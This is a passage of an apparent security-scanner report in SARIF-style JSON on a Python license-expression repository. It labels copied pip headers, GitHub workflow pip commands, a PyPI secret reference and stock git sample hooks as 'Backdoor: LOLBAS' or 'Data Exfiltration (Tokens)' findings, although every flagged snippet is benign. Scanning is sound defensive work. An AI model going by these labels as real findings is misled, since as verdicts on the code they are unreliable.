                    "text": "copied from pip-20.3.1 pip/_internal/utils/compatibility_tags.py\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/utils/compatibility_tags.py\n\nCopyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n",
                    "rendered": {
                      "text": "copied from pip-20.3.1 pip/_internal/utils/compatibility_tags.py\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/utils/compatibility_tags.py\n\nCopyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n",
                      "markdown": "`copied from pip-20.3.1 pip/_internal/utils/compatibility_tags.py\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/utils/compatibility_tags.py\n\nCopyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/test_utils_pip_compatibility_tags.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 27,
                  "endLine": 6,
                  "endColumn": 32,
                  "snippet": {
                    "text": "copied from pip-20.3.1 pip/tests/unit/test_utils_compatibility_tags.py\ndownload_url: https://raw.githubusercontent.com/pypa/pip/20.3.1/tests/unit/test_utils_compatibility_tags.py\n\nCopyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n",
                    "rendered": {
                      "text": "copied from pip-20.3.1 pip/tests/unit/test_utils_compatibility_tags.py\ndownload_url: https://raw.githubusercontent.com/pypa/pip/20.3.1/tests/unit/test_utils_compatibility_tags.py\n\nCopyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n",
                      "markdown": "`copied from pip-20.3.1 pip/tests/unit/test_utils_compatibility_tags.py\ndownload_url: https://raw.githubusercontent.com/pypa/pip/20.3.1/tests/unit/test_utils_compatibility_tags.py\n\nCopyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.github/workflows/docs-ci.yml"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 13,
                  "endLine": 24,
                  "endColumn": 18,
                  "snippet": {
                    "text": "          python-version: ${{ matrix.python-version }}\n\n      - name: Install Dependencies\n        run:  pip install -e .[docs]\n\n      - name: Check Sphinx Documentation build minimally\n        working-directory: ./docs\n",
                    "rendered": {
                      "text": "          python-version: ${{ matrix.python-version }}\n\n      - name: Install Dependencies\n        run:  pip install -e .[docs]\n\n      - name: Check Sphinx Documentation build minimally\n        working-directory: ./docs\n",
                      "markdown": "`          python-version: ${{ matrix.python-version }}\n\n      - name: Install Dependencies\n        run:  pip install -e .[docs]\n\n      - name: Check Sphinx Documentation build minimally\n        working-directory: ./docs\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.github/workflows/pypi-release.yml"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 22,
                  "endLine": 34,
                  "endColumn": 27,
                  "snippet": {
                    "text": "          python-version: 3.9\n\n      - name: Install pypa/build\n        run: python -m pip install build --user\n\n      - name: Build a binary wheel and a source tarball\n        run: python -m build --sdist --wheel --outdir dist/\n",
                    "rendered": {
                      "text": "          python-version: 3.9\n\n      - name: Install pypa/build\n        run: python -m pip install build --user\n\n      - name: Build a binary wheel and a source tarball\n        run: python -m build --sdist --wheel --outdir dist/\n",
                      "markdown": "`          python-version: 3.9\n\n      - name: Install pypa/build\n        run: python -m pip install build --user\n\n      - name: Build a binary wheel and a source tarball\n        run: python -m build --sdist --wheel --outdir dist/\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.github/workflows/pypi-release.yml"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 10,
                  "endLine": 86,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        if: startsWith(github.ref, 'refs/tags')\n        uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          password: ${{ secrets.PYPI_API_TOKEN }}\n",
                    "rendered": {
                      "text": "        if: startsWith(github.ref, 'refs/tags')\n        uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          password: ${{ secrets.PYPI_API_TOKEN }}\n",
                      "markdown": "`        if: startsWith(github.ref, 'refs/tags')\n        uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          password: ${{ secrets.PYPI_API_TOKEN }}\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-merge-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 74,
                  "endLine": 74,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                    "rendered": {
                      "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                      "markdown": "`\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 2,
                  "endLine": 65,
                  "endColumn": 8,
                  "snippet": {
                    "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                    "rendered": {
                      "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                      "markdown": "`unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 54,
                  "endLine": 54,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                    "rendered": {
                      "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                      "markdown": "`\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 53,
                  "endLine": 53,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                    "rendered": {
                      "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                      "markdown": "`\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 27,
                  "endLine": 51,
                  "endColumn": 33,
                  "snippet": {
                    "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                    "rendered": {
                      "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                      "markdown": "`if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
                    "rendered": {
                      "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
                      "markdown": "`validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 69,
                  "endLine": 11,
                  "endColumn": 74,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 40,
                  "endLine": 122,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 11,
                  "endLine": 122,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 39,
                  "endLine": 89,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                    "rendered": {
                      "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                      "markdown": "`\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 21,
                  "endLine": 34,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                    "rendered": {
                      "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                      "markdown": "`\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-applypatch.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-receive.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 1,
                  "endLine": 38,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                    "rendered": {
